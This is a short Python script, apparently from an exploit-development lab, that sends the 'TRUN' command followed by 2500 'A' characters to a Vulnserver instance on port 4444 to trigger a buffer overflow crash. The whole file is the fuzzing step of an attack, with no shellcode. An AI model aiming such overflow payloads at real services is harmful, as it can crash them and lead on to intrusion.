#!/usr/bin/env python

import os
import sys
import socket

host = '192.168.1.100  '
port = 4444

buf = "A" * 2500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

refused = s.connect_ex((host, port))

if refused:
    print("Could not connect to vulnserver!")
else:
    s.send("TRUN /.:/"+buf)
    print("Fuzzed successfully!")
    s.close()
